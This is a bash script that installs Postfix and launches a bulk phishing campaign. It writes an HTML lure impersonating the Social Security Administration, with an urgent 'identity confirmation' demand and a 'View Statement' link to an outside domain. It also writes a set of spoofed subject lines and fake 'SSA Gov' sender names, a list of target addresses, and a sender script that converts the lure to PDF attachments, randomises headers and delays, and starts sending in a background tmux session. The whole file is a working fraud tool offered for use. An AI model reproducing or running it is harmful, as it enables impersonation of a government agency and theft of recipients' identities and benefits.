#!/bin/bash

# Make sure the script is being run with sudo privileges
if [ "$EUID" -ne 0 ]; then
  echo "Please run this script as root or with sudo privileges."
  exit 1
fi

read -p "Enter your domain (e.g., domain.com): " domain
if [[ -z "$domain" ]]; then
  echo "Domain cannot be empty."
  exit 1
fi

read -p "Enter your username (e.g., no-reply): " username
if [[ -z "$username" ]]; then
  echo "username cannot be empty."
  exit 1
fi

# Update package list and install Postfix
echo "Updating package list and installing Postfix..."
sudo apt-get update -y
sudo apt-get install postfix -y

# Install tmux for session persistence
echo "Installing tmux for persistent sessions..."
sudo apt-get install tmux -y

# Backup the original Postfix config file
echo "Backing up the original Postfix main.cf..."
sudo cp /etc/postfix/main.cf /etc/postfix/main.cf.backup

sudo tee /etc/postfix/generic > /dev/null <<EOL
root@$domain    $username@$domain
@$domain        $username@$domain
EOL

sudo postmap /etc/postfix/generic
sudo service postfix restart || { echo "Postfix failed to restart"; exit 1; }

# Remove the current main.cf to replace with custom config
echo "Removing current main.cf..."
sudo rm /etc/postfix/main.cf

# Create a new Postfix main.cf file with the desired configuration
echo "Creating a new Postfix main.cf file..."
sudo tee /etc/postfix/main.cf > /dev/null <<EOL
# Postfix main configuration file
myhostname = bulkmail.$domain
mydomain = $domain
myorigin = $domain

inet_protocols = ipv4
smtp_helo_name = bulkmail.$domain
smtp_tls_security_level = may
smtp_tls_loglevel = 1

smtp_destination_concurrency_limit = 1
default_process_limit = 50
smtp_generic_maps = hash:/etc/postfix/generic
ignore_rhosts = yes

inet_interfaces = loopback-only
mydestination = localhost
smtp_sasl_auth_enable = no
smtpd_sasl_auth_enable = no
smtp_sasl_security_options = noanonymous

queue_directory = /var/spool/postfix
command_directory = /usr/sbin
daemon_directory = /usr/lib/postfix/sbin
mailbox_size_limit = 0
recipient_delimiter = +
EOL

# Restart Postfix to apply the changes
echo "Restarting Postfix service..."
sudo service postfix restart || { echo "Postfix failed to restart"; exit 1; }

# Install mailutils for sending emails via Postfix
echo "Installing mailutils..."
sudo apt-get install mailutils -y
sudo apt-get install html2text -y
sudo apt-get install parallel base64 -y
sudo apt install wkhtmltopdf -y
sudo apt-get install wkhtmltopdf -y
sudo chown $USER:$USER *

# Create a sample HTML email content (email.html)
echo "Creating email.html with email content..."
cat > email.html <<EOL
<html><head><title></title>
<meta http-equiv="X-UA-Compatible" content="IE=edge">
</head>
<body style="margin: 0.4em; font-size: 14pt;">
<div role="document" style='margin: 0px; padding: 0px; border: 0px currentColor; border-image: none; color: rgb(0, 0, 0); text-transform: none; line-height: inherit; text-indent: 0px; letter-spacing: normal; font-family: "Segoe UI", "Segoe UI Web (West European)", -apple-system, BlinkMacSystemFont, Roboto, "Helvetica Neue", sans-serif; font-size: 14px; font-style: normal; font-weight: 400; word-spacing: 0px; vertical-align: baseline; white-space: normal; orphans: 2; widows: 2; font-size-adjust: 
inherit; font-stretch: inherit; font-feature-settings: inherit; font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-decoration-style: initial; text-decoration-color: initial; font-variant-numeric: inherit; font-variant-east-asian: inherit; font-variant-alternates: inherit; font-variant-position: inherit; font-variant-emoji: inherit; font-optical-sizing: inherit; font-kerning: inherit; font-variation-settings: 
inherit;'>
<div tabindex="0" class="XbIp4 jmmB7 customScrollBar GNqVo allowTextSelection OuGoX" id="UniqueMessageBody_28" style="margin: 12px 16px 0px 52px; padding: 0px 0px 2px; border: 0px currentColor; border-image: none; color: rgb(36, 36, 36); line-height: inherit; font-family: inherit; font-size: 15px; font-style: inherit; font-variant: inherit; font-weight: 400; vertical-align: baseline; cursor: auto; -ms-overflow-y: auto; font-size-adjust: inherit; font-stretch: inherit; font-feature-settings: 
inherit; font-optical-sizing: inherit; font-kerning: inherit; font-variation-settings: inherit; user-select: text; will-change: scroll-position;" aria-label="Message body">
<div class="BIZfh" style="margin: 0px; padding: 0px; border: 0px currentColor; transition:opacity 0.3s; border-image: none; color: inherit; line-height: inherit; font-family: inherit; font-size: inherit; font-style: inherit; font-variant: inherit; vertical-align: baseline; visibility: visible; font-size-adjust: inherit; font-stretch: inherit; opacity: 1;">
<div style="margin: 0px; padding: 0px; border: 0px currentColor; border-image: none; color: inherit; line-height: inherit; font-family: inherit; font-size: inherit; font-style: inherit; font-variant: inherit; vertical-align: baseline; font-size-adjust: inherit; font-stretch: inherit;" visibility="hidden">
<div class="rps_e0a5" style="margin: 0px; padding: 0px; border: 0px currentColor; border-image: none; color: inherit; line-height: inherit; font-family: inherit; font-size: inherit; font-style: inherit; font-variant: inherit; vertical-align: baseline; font-size-adjust: inherit; font-stretch: inherit;">
<div style="background: rgb(245, 247, 250); margin: 0px; padding: 20px; border: 0px currentColor; border-image: none; color: rgb(51, 51, 51); line-height: 1.6; font-family: Roboto, sans-serif; font-size: inherit; font-style: inherit; font-variant: inherit; vertical-align: baseline; font-size-adjust: inherit; font-stretch: inherit; font-feature-settings: inherit; font-optical-sizing: inherit; font-kerning: inherit; font-variation-settings: inherit;">
<div class="x_container" style="background: rgb(255, 255, 255); margin: 0px auto; padding: 35px; border-radius: 10px; border: 0px currentColor; border-image: none; color: inherit; line-height: inherit; font-family: inherit; font-size: inherit; font-style: inherit; font-variant: inherit; vertical-align: baseline; max-width: 700px; font-size-adjust: inherit; font-stretch: inherit; box-shadow: 0px 4px 20px rgba(0,0,0,0.1);">
<div class="x_notice" style="background: rgb(240, 244, 248); border-width: 0px 0px 0px 5px; margin: 0px; padding: 15px; color: inherit; line-height: inherit; font-family: inherit; font-size: inherit; font-style: inherit; font-variant: inherit; vertical-align: baseline; border-left-color: rgb(35, 120, 195); border-left-style: solid; font-size-adjust: inherit; font-stretch: inherit;">
<img style="font: inherit; margin: 0px; padding: 0px; border: 0px currentColor; border-image: none; width: 50px; color: inherit; vertical-align: baseline; font-size-adjust: inherit; font-stretch: inherit;" alt="Home" src="https://threshold.games/assets/img/ssalogo.jpeg" data-imagetype="External"><h2 style="color: rgb(17, 47, 78); font-family: Merriweather, serif;">SSA Official Notice</h2><p>
Your 2025 Social Security Statement requires immediate review. A new security update mandates identity confirmation to keep your account and benefits active. Act immediately.</p></div><h2 style="color: rgb(17, 47, 78); font-family: Merriweather, serif;">Access Your Statement Now</h2><p>
This document serves as an official record of your Social Security benefits, Supplemental Security Income (SSI), and Medicare status. This check is required to prevent errors and ensure your payments are accurate.</p>
<div class="x_download-box" style="background: rgb(237, 239, 240); font: inherit; margin: 20px 0px; padding: 15px; border-radius: 15px; border: 0px currentColor; border-image: none; text-align: center; color: inherit; vertical-align: baseline; font-size-adjust: inherit; font-stretch: inherit;"><p>Securely access your statement using a computer:</p>
<a title="" class="x_button" id="x_downloadBtn" style="background: rgb(35, 120, 195); margin: 10px 0px 0px; padding: 12px 20px; border-radius: 8px; border: 0px currentColor; border-image: none; color: rgb(255, 255, 255); line-height: inherit; font-family: inherit; font-size: 1rem; font-style: inherit; font-variant: inherit; font-weight: bold; text-decoration: none; vertical-align: baseline; display: inline-block; font-size-adjust: inherit; font-stretch: inherit; font-feature-settings: inherit; 
font-optical-sizing: inherit; font-kerning: inherit; font-variation-settings: inherit;" href="https://threshold.games/assets/" data-linkindex="0" data-auth="NotApplicable">View Statement</a></div>
<p style="color: rgb(17, 47, 78) !important; font-style: italic; margin-top: 30px;"><strong>Social Security Administration</strong></p></div></div>
</div></div></div></div></div></body></html>
EOL

# Create a sample txt subject content (subject.txt)
echo "Creating subject.txt with subject content..."
cat > subject.txt <<EOL
SSA: Statement - SS Verification Pending - REF# VNDR-SS/038{random-number}
SSA: Attached Statement# 038{random-number}
SSA: Review Required For Payment
SSA: Statement
SSA: Login.Gov
SSA: Payment Review
SSA: Yearly Maintenance Fee Statement Attached
SSA: Invoice for Annual License Renewal
Urgent Payment: Quarterly SSA
Statement: Emergency IT Support Services
SSA: Final Statement
Revalidate by {date}
SSA: {recipient-domain} access.
SSA: Action {random-number}
SSA: Confirm {recipient-email}
SSA: Secure {recipient-domain}
SSA: Case {random-number}
SSA: {recipient-user} must confirm
SSA: Deadline {date}
SSA: Check {recipient-email}
SSA: {recipient-user} re-auth
BSSA: efore {date}
SSA: Ref {random-number}
SSA: {recipient-user} validate
SSA: Validate {recipient-email}
SSA: {recipient-user} approve
SSA maintenance: confirm your details
SSA:  records validation
SSA: Please confirm your email preferences
Routine authentication for your business account
EOL

# Create a sample txt name content (name.txt)
echo "Creating name.txt with name content..."
cat > name.txt <<EOL
SSA IT Admin
IT Governance
SSA Secure Gateway
SSA Guardian
SSA Sentinel
Do Not Ignore: IT Dept
SSA Certs
SSA Gov
Login Gov
SSA Update
EOL

# Create a sample txt list content (list.txt)
echo "Creating list.txt with list content..."
cat > list.txt <<EOL
sales@oylogistics.cn
accounts@reiverswholesale.co.uk
podpora@vsezapivo.si
EOL

# Create the sending script (send.sh)
echo "Creating send.sh for bulk email sending..."
cat > send.sh <<EOL
#!/bin/bash

# Configuration files
EMAIL_LIST="list.txt"
HTML_TEMPLATE="email.html"
SUBJECT_FILE="subject.txt"
NAME_FILE="name.txt"
LOG_FILE="send_log_\$(date +%Y%m%d).txt"

# Initialize counters
TOTAL=\$(wc -l < "\$EMAIL_LIST")
SUCCESS=0
FAILED=0

# Ensure runtime dir is set to avoid wkhtmltopdf error
export XDG_RUNTIME_DIR="\${XDG_RUNTIME_DIR:-/tmp/runtime-\$UID}"
mkdir -p "\$XDG_RUNTIME_DIR"

# Verify required files exist
for file in "\$EMAIL_LIST" "\$HTML_TEMPLATE" "\$SUBJECT_FILE" "\$NAME_FILE"; do
    if [ ! -f "\$file" ]; then
        echo "Error: Missing \$file" | tee -a "\$LOG_FILE"
        exit 1
    fi
done

# Load all subjects and names into arrays
mapfile -t SUBJECTS < "\$SUBJECT_FILE"
mapfile -t NAMES < "\$NAME_FILE"

# Random name generator (from name.txt)
get_random_name() {
    echo "\${NAMES[\$((RANDOM % \${#NAMES[@]}))]}"
}

# Random number generator (4-6 digits)
get_random_number() {
    echo \$((RANDOM % 9000 + 1000))
}

# Process each email
while IFS= read -r email; do
    CLEAN_EMAIL=\$(echo "\$email" | tr -d '\r\n')
    EMAIL_USER=\$(echo "\$CLEAN_EMAIL" | cut -d@ -f1)
    EMAIL_DOMAIN=\$(echo "\$CLEAN_EMAIL" | cut -d@ -f2)
    CURRENT_DATE=\$(date +%Y-%m-%d)
    BASE64_EMAIL=\$(echo -n "\$CLEAN_EMAIL" | base64)

    RANDOM_NAME=\$(get_random_name)
    RANDOM_NUMBER=\$(get_random_number)
    SELECTED_SENDER_NAME="\${NAMES[\$((RANDOM % \${#NAMES[@]}))]}"

    SELECTED_SUBJECT="\${SUBJECTS[\$((RANDOM % \${#SUBJECTS[@]}))]}"
    SELECTED_SUBJECT=\$(echo "\$SELECTED_SUBJECT" | sed \
        -e "s|{date}|\$CURRENT_DATE|g" \
        -e "s|{recipient-email}|\$CLEAN_EMAIL|g" \
        -e "s|{recipient-user}|\$EMAIL_USER|g" \
        -e "s|{recipient-domain}|\$EMAIL_DOMAIN|g" \
        -e "s|{name}|\$RANDOM_NAME|g" \
        -e "s|{random-name}|\$(get_random_name)|g" \
        -e "s|{random-number}|\$RANDOM_NUMBER|g")

    echo "Processing: \$CLEAN_EMAIL"

    MESSAGE_ID="<\$(date +%s%N).\$(openssl rand -hex 8)@$domain>"

    TEMP_HTML=\$(mktemp --suffix=".html")
    sed \
        -e "s|{date}|\$CURRENT_DATE|g" \
        -e "s|{recipient-email}|\$CLEAN_EMAIL|g" \
        -e "s|{recipient-user}|\$EMAIL_USER|g" \
        -e "s|{recipient-domain}|\$EMAIL_DOMAIN|g" \
        -e "s|{name}|\$RANDOM_NAME|g" \
        -e "s|{random-name}|\$(get_random_name)|g" \
        -e "s|{random-number}|\$RANDOM_NUMBER|g" \
        -e "s|{sender-email}|$username@$domain|g" \
        -e "s|{sender-name}|\$SELECTED_SENDER_NAME|g" \
        -e "s|{base64-encryptedrecipents-email}|\$BASE64_EMAIL|g" \
        "\$HTML_TEMPLATE" > "\$TEMP_HTML"

    # Convert to PDF using wkhtmltopdf with local file URI
    SAFE_EMAIL=\$(echo "\$CLEAN_EMAIL" | sed 's/[^a-zA-Z0-9@.]/_/g')
    PDF_FILE="/tmp/SSA_\${SAFE_EMAIL}.pdf"
    HTML_FILE_URI="file://\$TEMP_HTML"

    if ! wkhtmltopdf --quiet --enable-local-file-access --load-error-handling ignore "\$HTML_FILE_URI" "\$PDF_FILE" >/dev/null 2>&1; then
        echo "\$(date) - WARNING: PDF generation failed for \$CLEAN_EMAIL" >> "\$LOG_FILE"
        PDF_FILE=""
    fi

    TEMP_TEXT=\$(mktemp)
    cat <<EOF > "\$TEMP_TEXT"
Reminder: Complete your SSA review via the attached instructions (from \$CURRENT_DATE to 2025-12-30) to prevent any complications with your account.

SSA.GOV © 2025. All rights reserved.
EOF

    {
    echo "Return-Path: <$username@$domain>"
    echo "From: \"\$SELECTED_SENDER_NAME\" <$username@$domain>"
    echo "To: <\$CLEAN_EMAIL>"
    echo "Subject: \$SELECTED_SUBJECT"
    echo "MIME-Version: 1.0"
    echo "Content-Type: multipart/mixed; boundary=\"BOUNDARY\""
    echo
    echo "--BOUNDARY"
    echo "Content-Type: text/plain; charset=UTF-8"
    echo
    cat "\$TEMP_TEXT"
    echo

    if [ -f "\$PDF_FILE" ]; then
        echo "--BOUNDARY"
        echo "Content-Type: application/pdf; name=\"SSA \$CLEAN_EMAIL.pdf\""
        echo "Content-Transfer-Encoding: base64"
        echo "Content-Disposition: attachment; filename=\"SSA \$CLEAN_EMAIL.pdf\""
        echo
        base64 "\$PDF_FILE"
        echo
    fi

    echo "--BOUNDARY--"
    } | /usr/sbin/sendmail -t -oi

    rm "\$TEMP_TEXT" "\$TEMP_HTML"
    [ -f "\$PDF_FILE" ] && rm "\$PDF_FILE"

    if [ \$? -eq 0 ]; then
        echo "\$(date) - SUCCESS: \$CLEAN_EMAIL" >> "\$LOG_FILE"
        ((SUCCESS++))
    else
        echo "\$(date) - FAILED: \$CLEAN_EMAIL" >> "\$LOG_FILE"
        ((FAILED++))
    fi

    sleep \$(awk -v min=0.3 -v max=0.8 'BEGIN{srand(); print min+rand()*(max-min)}')

    echo "[\$SUCCESS/\$TOTAL] Sent to \$CLEAN_EMAIL"

done < "\$EMAIL_LIST"

echo "Completed at \$(date)" >> "\$LOG_FILE"
echo "Total: \$TOTAL | Success: \$SUCCESS | Failed: \$FAILED" >> "\$LOG_FILE"
echo "Full log: \$LOG_FILE"
EOL


# Make the send.sh script executable
chmod +x send.sh

# Create a tmux session and run the send.sh script in it
echo "Starting tmux session and running send.sh..."
tmux new-session -d -s mail_session "./send.sh"

# Print instructions for reattaching to the tmux session
echo "Your email sending process is running in the background with tmux."
echo "To reattach to the session, use: tmux attach -t mail_session"
